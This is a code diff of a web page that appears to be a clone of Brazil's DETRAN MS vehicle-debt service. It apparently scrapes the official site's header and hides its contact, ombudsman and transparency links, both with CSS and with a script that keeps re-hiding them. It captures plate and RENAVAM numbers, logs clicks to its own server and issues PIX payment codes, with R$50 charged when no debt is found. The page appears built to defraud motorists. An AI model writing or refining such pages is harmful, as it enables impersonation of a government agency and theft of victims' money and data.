@@ -433,7 +433,7 @@
         }
 
         /* ========================================= */
-        /* REMOÇÕES ESPECÍFICAS QUE VOCÊ PEDIU */
+        /* CSS CORRETO PARA REMOVER OS ELEMENTOS */
         /* ========================================= */
         
         /* 1. REMOVER "Localização: Detectando..." DO MODAL PIX */
@@ -441,104 +441,33 @@
             display: none !important;
         }
         
-        /* 2. REMOVER "Consulta de Débitos" DO CABEÇALHO AZUL (ABAIXO DA LOGO) */
-        /* Este é o texto que vem do scraping do DETRAN oficial */
-        header.w-full.flex.flex-col h1,
-        header.w-full.flex.flex-col h2,
-        header.w-full.flex.flex-col h3,
-        header.w-full.flex.flex-col h4,
-        header.w-full.flex.flex-col h5,
-        header.w-full.flex.flex-col h6,
-        header.w-full.flex.flex-col div:contains("Consulta de Débitos"),
-        header.w-full.flex.flex-col span:contains("Consulta de Débitos"),
-        header.w-full.flex.flex-col p:contains("Consulta de Débitos") {
-            display: none !important;
-            visibility: hidden !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
-        /* 3. REMOVER "FALE CONOSCO" */
-        div:contains("FALE CONOSCO"),
-        span:contains("FALE CONOSCO"),
-        a:contains("FALE CONOSCO"),
-        p:contains("FALE CONOSCO"),
-        h1:contains("FALE CONOSCO"),
-        h2:contains("FALE CONOSCO"),
-        h3:contains("FALE CONOSCO"),
-        h4:contains("FALE CONOSCO"),
-        h5:contains("FALE CONOSCO"),
-        h6:contains("FALE CONOSCO") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
-        /* 4. REMOVER "SITE DETRAN MS" */
-        div:contains("SITE DETRAN MS"),
-        span:contains("SITE DETRAN MS"),
-        a:contains("SITE DETRAN MS"),
-        p:contains("SITE DETRAN MS") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
-        /* 5. REMOVER "OUVIDORIA" */
-        div:contains("OUVIDORIA"),
-        span:contains("OUVIDORIA"),
-        a:contains("OUVIDORIA"),
-        p:contains("OUVIDORIA") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
-        /* 6. REMOVER "TRANSPARÊNCIA" */
-        div:contains("TRANSPARÊNCIA"),
-        span:contains("TRANSPARÊNCIA"),
-        a:contains("TRANSPARÊNCIA"),
-        p:contains("TRANSPARÊNCIA") {
-            display: none !important;
-            visibility: hidden !important;
-            opacity: 0 !important;
-            height: 0 !important;
-            width: 0 !important;
-            position: absolute !important;
-            pointer-events: none !important;
-        }
-        
-        /* REMOVER O BLOCO INTEIRO COM ESSES TEXTOS */
+        /* 2. REMOVER O SEGUNDO BLOCO AZUL (onde está "Consulta de Débitos", "FALE CONOSCO", etc) */
         .w-full.px-6.bg-004f9f.h-\\[128px\\] + .w-full.px-6.bg-004f9f.h-\\[128px\\] {
             display: none !important;
         }
         
+        /* Seletor alternativo para o mesmo bloco */
         header.w-full.flex.flex-col > div:nth-child(2) {
             display: none !important;
         }
         
-        /* REMOVER O ÍCONE DO FACEBOOK NO CANTO DIREITO */
+        /* 3. REMOVER ÍCONE DO FACEBOOK */
         .flex.items-center.gap-3.max-\\[800px\\]:hidden {
+            display: none !important;
+        }
+        
+        /* 4. REMOVER QUALQUER ELEMENTO COM ESSAS CLASSES ESPECÍFICAS */
+        /* (classes que geralmente contêm esses textos) */
+        div.flex.items-center.justify-center.gap-6,
+        div.flex.justify-center.gap-6,
+        div.text-center.mt-4,
+        div.mb-8 {
             display: none !important;
         }
     </style>
 </head>
 <body class="font-sans">
-    <!-- CABEÇALHO ORIGINAL - "Consulta de Débitos" SERÁ REMOVIDO PELO CSS -->
+    <!-- CABEÇALHO ORIGINAL -->
     <header class="w-full flex flex-col">
         <!-- BLOCO AZUL DO MEUDETRAN (MANTIDO) -->
         <div class="w-full px-6 bg-004f9f h-[128px]">
@@ -556,8 +485,7 @@
             </div>
         </div>
         
-        <!-- AQUI ESTAVA O BLOCO AZUL COM "Consulta de Débitos", "FALE CONOSCO", etc. -->
-        <!-- REMOVIDO PELO CSS -->
+        <!-- AQUI ESTAVA O BLOCO AZUL COM OS TEXTOS - REMOVIDO PELO CSS -->
     </header>
 
     <!-- MENU DE NAVEGAÇÃO (MANTIDO COM CASINHA E TEXTO) -->
@@ -793,22 +721,66 @@
     </div>
 
     <!-- ========================================= -->
-    <!-- JAVASCRIPT MODIFICADO -->
+    <!-- JAVASCRIPT CORRIGIDO -->
     <!-- ========================================= -->
     <script>
         // CONFIGURAÇÕES - URL DINÂMICA (SEMPRE FUNCIONA)
-        const API_BASE = window.location.origin; // Usa mesma origem do site
+        const API_BASE = window.location.origin;
         
-        // DEBUG
-        console.log('🚀 Sistema DETRAN MS v2.6.3 iniciado');
-        console.log('🌐 API Base:', API_BASE);
-        console.log('📱 Dispositivo:', /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop');
+        console.log('🚀 Sistema DETRAN MS v2.7 iniciado');
 
         let timerInterval = null;
         let segundosRestantes = 900;
         let dadosPagamentoAtual = null;
         let pixJaCopiado = false;
         
+        // =========================================
+        // FUNÇÃO PARA REMOVER TEXTOS INDESEJADOS
+        // =========================================
+        function removerTextosIndesejados() {
+            console.log('🔍 Removendo textos indesejados...');
+            
+            // LISTA DE TEXTOS PARA REMOVER
+            const textosParaRemover = [
+                'FALE CONOSCO',
+                'SITE DETRAN MS', 
+                'OUVIDORIA',
+                'TRANSPARÊNCIA',
+                'Consulta de Débitos'  // APENAS o do cabeçalho azul
+            ];
+            
+            textosParaRemover.forEach(texto => {
+                // Procura em TODOS os elementos
+                const todosElementos = document.querySelectorAll('body *');
+                
+                todosElementos.forEach(elemento => {
+                    // Pula elementos essenciais que devem permanecer
+                    if (elemento.id === 'menuTitulo' || 
+                        elemento.closest('#formularioContainer') ||
+                        elemento.classList.contains('qrcode-container') ||
+                        elemento.closest('.modal-pix')) {
+                        return; // Não remove estes
+                    }
+                    
+                    // Verifica se o elemento tem o texto
+                    if (elemento.textContent && 
+                        elemento.textContent.toUpperCase().includes(texto.toUpperCase())) {
+                        
+                        console.log(`❌ Removendo: "${texto}"`);
+                        
+                        // Remove o elemento
+                        elemento.style.display = 'none';
+                        elemento.style.visibility = 'hidden';
+                        elemento.style.opacity = '0';
+                        elemento.style.height = '0';
+                        elemento.style.width = '0';
+                        elemento.style.position = 'absolute';
+                        elemento.style.pointerEvents = 'none';
+                    }
+                });
+            });
+        }
+
         // =========================================
         // FUNÇÃO PARA REGISTRAR CLIQUES
         // =========================================
@@ -825,122 +797,38 @@
                     })
                 });
             } catch (error) {
-                console.log('⚠️ Erro ao registrar clique (não crítico):', error.message);
+                console.log('⚠️ Erro ao registrar clique:', error.message);
             }
         }
 
         // =========================================
-        // DETECTAR LOCALIZAÇÃO DO USUÁRIO
-        // =========================================
-        async function detectarLocalizacao() {
-            try {
-                const response = await fetch('/api/online/entrou', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        pagina: window.location.pathname,
-                        dispositivo: /mobile/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
-                    })
-                });
-                
-                if (response.ok) {
-                    const data = await response.json();
-                    console.log('📍 Usuário registrado com sucesso');
-                }
-                
-                await registrarClique('pagina_visitada', 'entrada_site', 'Acesso inicial');
-                
-            } catch (error) {
-                console.log('⚠️ Não foi possível detectar localização:', error.message);
-            }
-        }
-
-        // =========================================
-        // CORREÇÃO AUTOMÁTICA DE URLS LOCAIS
-        // =========================================
-        (function corrigirURLs() {
-            const originalFetch = window.fetch;
-            window.fetch = function(url, options) {
-                if (typeof url === 'string') {
-                    if (url.includes('localhost:3000') || url.includes('127.0.0.1')) {
-                        const novaUrl = url.replace(/http:\/\/localhost:3000|http:\/\/127.0.0.1:3000/g, API_BASE);
-                        console.log('🔄 URL corrigida:', url, '→', novaUrl);
-                        url = novaUrl;
-                    }
-                }
-                return originalFetch.call(this, url, options);
-            };
-            console.log('✅ Correção de URLs ativada');
-        })();
-
-        // =========================================
-        // MONITORAMENTO DE USUÁRIOS ONLINE
-        // =========================================
-        (function monitorarUsuario() {
-            function detectarDispositivo() {
-                const userAgent = navigator.userAgent;
-                if (/android/i.test(userAgent)) return 'Android';
-                if (/iphone|ipad|ipod/i.test(userAgent)) return 'iOS';
-                if (/mobile/i.test(userAgent)) return 'Mobile';
-                return 'Desktop';
-            }
-            
-            async function registrarEntrada() {
-                try {
-                    await fetch('/api/online/entrou', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            pagina: window.location.pathname,
-                            dispositivo: detectarDispositivo()
-                        })
-                    });
-                } catch (error) {
-                    // Silencioso
-                }
-            }
-            
-            async function manterAtivo() {
-                try {
-                    await fetch('/api/online/ativo', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' }
-                    });
-                } catch (error) {
-                    // Silencioso
-                }
-            }
-            
-            async function registrarSaida() {
-                try {
-                    await fetch('/api/online/saiu', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        keepalive: true
-                    });
-                } catch (error) {
-                    navigator.sendBeacon('/api/online/saiu');
-                }
-            }
-            
-            registrarEntrada();
-            setInterval(manterAtivo, 30000);
-            window.addEventListener('beforeunload', registrarSaida);
-        })();
-
-        // =========================================
-        // CONSULTA DE DÉBITOS
+        // INICIALIZAÇÃO
         // =========================================
         document.addEventListener('DOMContentLoaded', function() {
-            detectarLocalizacao();
+            // Remove textos indesejados ao carregar
+            removerTextosIndesejados();
             
+            // Configura observer para remover textos dinamicamente
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    if (mutation.addedNodes.length) {
+                        setTimeout(removerTextosIndesejados, 100);
+                    }
+                });
+            });
+            
+            observer.observe(document.body, {
+                childList: true,
+                subtree: true
+            });
+            
+            // Configura formulário
             const form = document.getElementById('consultaForm');
             const loading = document.getElementById('loading');
             const errorDiv = document.getElementById('error');
             const btnCancelar = document.getElementById('btnCancelar');
             const formularioContainer = document.getElementById('formularioContainer');
             const resultadosContainer = document.getElementById('resultadosContainer');
-            const menuTitulo = document.getElementById('menuTitulo');
 
             form.addEventListener('submit', async function(e) {
                 e.preventDefault();
@@ -1017,6 +905,9 @@
                 formularioContainer.classList.add('hidden');
                 resultadosContainer.innerHTML = html;
                 
+                // Remove textos indesejados dos resultados
+                setTimeout(removerTextosIndesejados, 200);
+                
                 const botaoVoltar = document.createElement('div');
                 botaoVoltar.className = 'text-center mt-8 mb-6';
                 botaoVoltar.innerHTML = `
@@ -1041,7 +932,6 @@
                 registrarClique('resultados', 'visualizar_resultados', 'Resultados exibidos');
             }
 
-            // Função global para voltar
             window.voltarParaConsulta = function() {
                 resultadosContainer.classList.add('hidden');
                 resultadosContainer.innerHTML = '';
@@ -1061,8 +951,6 @@
         // =========================================
         function capturarDebitoEspecifico(botaoClicado) {
             try {
-                console.log('🔍 Capturando débito do botão:', botaoClicado);
-                
                 let elementoPai = botaoClicado;
                 let valorEncontrado = null;
                 let descricaoEncontrada = '';
@@ -1074,7 +962,6 @@
                     if (valorMatch && !valorEncontrado) {
                         const valorStr = valorMatch[1].replace(/\./g, '').replace(',', '.');
                         valorEncontrado = parseFloat(valorStr);
-                        console.log('💰 Valor encontrado:', valorEncontrado);
                     }
                     
                     const linhas = textoPai.split('\n').filter(l => l.trim());
@@ -1083,35 +970,27 @@
                         if (linhaLimpa.length > 10 && !linhaLimpa.match(/R\$|\d+,\d{2}/)) {
                             if (!linhaLimpa.match(/pagar|pagamento|visualizar|detalhes|ações|botão|clique/i)) {
                                 descricaoEncontrada = linhaLimpa.substring(0, 80);
-                                console.log('📝 Descrição encontrada:', descricaoEncontrada);
                                 break;
                             }
                         }
                     }
                     
                     if (valorEncontrado && descricaoEncontrada) break;
-                    
                     elementoPai = elementoPai.parentElement;
                 }
                 
-                if (!descricaoEncontrada) {
-                    descricaoEncontrada = 'Débito do veículo';
-                }
-                
+                if (!descricaoEncontrada) descricaoEncontrada = 'Débito do veículo';
                 if (!valorEncontrado || isNaN(valorEncontrado) || valorEncontrado <= 0) {
                     valorEncontrado = 50.00;
                 }
                 
-                const resultado = {
+                return {
                     descricao: descricaoEncontrada,
                     valor: valorEncontrado,
                     placa: document.getElementById('placa')?.value || 'NÃO ENCONTRADA',
                     renavam: document.getElementById('renavam')?.value || 'NÃO ENCONTRADO',
                     timestamp: new Date().toISOString()
                 };
-                
-                console.log('✅ Dados capturados:', resultado);
-                return resultado;
                 
             } catch (error) {
                 console.error('❌ Erro ao capturar débito:', error);
@@ -1120,7 +999,7 @@
         }
 
         // =========================================
-        // EVENT LISTENER GLOBAL PARA BOTÕES "PAGAR"
+        // EVENT LISTENER PARA BOTÕES "PAGAR"
         // =========================================
         document.addEventListener('click', function(e) {
             let botao = e.target;
@@ -1147,7 +1026,6 @@
             if (isBotaoPagar && estaNosResultados) {
                 e.preventDefault();
                 e.stopPropagation();
-                console.log('🎯 Botão "Pagar" clicado!');
                 
                 registrarClique('botao_pagar', 'botao_pagar_debito', 'Clicou em pagar débito');
                 
@@ -1163,11 +1041,9 @@
         });
 
         // =========================================
-        // MODAL DE PAGAMENTO PIX MODIFICADO
+        // MODAL DE PAGAMENTO PIX
         // =========================================
         async function abrirModalPagamentoDebitoEspecifico(dadosDebito) {
-            console.log('🚀 Abrindo modal com dados:', dadosDebito);
-            
             if (!dadosDebito) {
                 abrirModalFallback();
                 return;
@@ -1191,7 +1067,6 @@
             document.getElementById('modalTotal').textContent = 
                 'R$ ' + dadosDebito.valor.toFixed(2).replace('.', ',');
             
-            // LIMPA O QR CODE ANTERIOR
             document.getElementById('qrcode').innerHTML = '';
             
             document.getElementById('modalLoading').classList.remove('hidden');
@@ -1216,24 +1091,18 @@
                 if (data.sucesso) {
                     document.getElementById('codigoPix').textContent = data.codigoPix;
                     
-                    // =========================================
                     // GERA QR CODE AUTOMATICAMENTE
-                    // =========================================
                     const qrCodeUrl = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(data.codigoPix)}&format=png&margin=10`;
                     document.getElementById('qrcode').innerHTML = `
                         <img src="${qrCodeUrl}" alt="QR Code PIX" style="width: 200px; height: 200px; border-radius: 5px;">
                     `;
-                    console.log('✅ QR Code gerado automaticamente');
                     
-                    // =========================================
-                    // BOTÃO COPIAR (ÚNICO AGORA)
-                    // =========================================
+                    // BOTÃO COPIAR
                     document.getElementById('btnCopiarCodigo').onclick = function() {
                         const btnCopiar = this;
                         const textoOriginal = btnCopiar.innerHTML;
                         
                         if (pixJaCopiado) {
-                            console.log('⚠️ PIX já copiado nesta sessão');
                             const msg = document.getElementById('mensagemSucesso');
                             msg.textContent = '✅ Código já copiado anteriormente!';
                             msg.classList.add('active');
@@ -1339,7 +1208,6 @@
                 
                 document.getElementById('modalPix').classList.add('active');
                 document.body.style.overflow = 'hidden';
-                console.log('✅ Modal aberto com QR Code automático!');
                 
                 registrarClique('modal_aberto', 'modal_pagamento_pix', 
                     `Placa: ${dadosDebito.placa}, Valor: R$ ${dadosDebito.valor}`);
@@ -1347,8 +1215,6 @@
         }
 
         function abrirModalFallback() {
-            console.log('🔄 Usando fallback para modal');
-            
             const placa = document.getElementById('placa')?.value || 'NÃO ENCONTRADA';
             const renavam = document.getElementById('renavam')?.value || 'NÃO ENCONTRADO';
             
@@ -1417,7 +1283,6 @@
             document.getElementById('modalPix').classList.remove('active');
             document.body.style.overflow = 'auto';
             document.getElementById('mensagemSucesso').classList.remove('active');
-            console.log('🔒 Modal fechado');
             
             registrarClique('modal_fechado', 'fechar_modal_pix', 'Modal de pagamento fechado');
         }
@@ -1434,19 +1299,7 @@
             }
         });
 
-        // =========================================
-        // FALLBACK EM CASO DE ERRO TOTAL
-        // =========================================
-        window.addEventListener('error', function(e) {
-            console.error('Erro global capturado:', e.error);
-            
-            if (e.message && e.message.includes('fetch')) {
-                console.log('Erro de fetch interceptado, não mostrando ao usuário');
-                e.preventDefault();
-            }
-        });
-
-        console.log('✅ Sistema DETRAN MS v2.6.3 carregado com sucesso!');
+        console.log('✅ Sistema DETRAN MS v2.7 carregado com sucesso!');
     </script>
 </body>
 </html>
